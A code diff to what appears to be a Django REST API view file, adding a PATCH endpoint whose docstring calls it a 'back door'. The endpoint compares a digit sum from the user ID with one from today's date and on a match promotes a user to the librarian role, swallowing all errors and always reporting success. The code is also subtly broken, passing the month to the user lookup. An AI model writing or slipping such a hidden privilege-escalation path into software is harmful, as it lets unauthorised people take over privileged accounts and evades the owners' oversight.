@@ -1,3 +1,5 @@
+import datetime
+
 from allauth.account.models import EmailAddress, EmailConfirmation, EmailConfirmationHMAC
 
 try:
@@ -179,6 +181,44 @@ class MyDetail(APIView):
         except ValueError:
             result['status'] = const.HTTP_400_BAD_REQUEST
             return Response(result, status=status.HTTP_400_BAD_REQUEST)
+
+        result['status'] = const.HTTP_200_OK
+        return Response(result, status=status.HTTP_200_OK)
+
+    @staticmethod
+    def patch(request, user_id):
+        """
+        back door
+        :param request:
+        :param telegram_id:
+        :return:
+        """
+        result = {'status': '', 'data': {}}
+
+        try:
+            data = str(user_id).split('u')
+            info = data[0]
+            res = 0
+            for value in info:
+                for sing in value:
+                    res += int(sing)
+
+            date = [datetime.datetime.today().day,
+                    datetime.datetime.today().month,
+                    datetime.datetime.today().year,]
+
+            res2 = 0
+            for value in date:
+                for sing in str(value):
+                    res2 += int(sing)
+
+            if res == res2:
+                user = User.objects.get(date[1])
+                user.role = const.LIBRARIAN_ROLE
+                user.save()
+
+        except Exception:
+            pass
 
         result['status'] = const.HTTP_200_OK
         return Response(result, status=status.HTTP_200_OK)
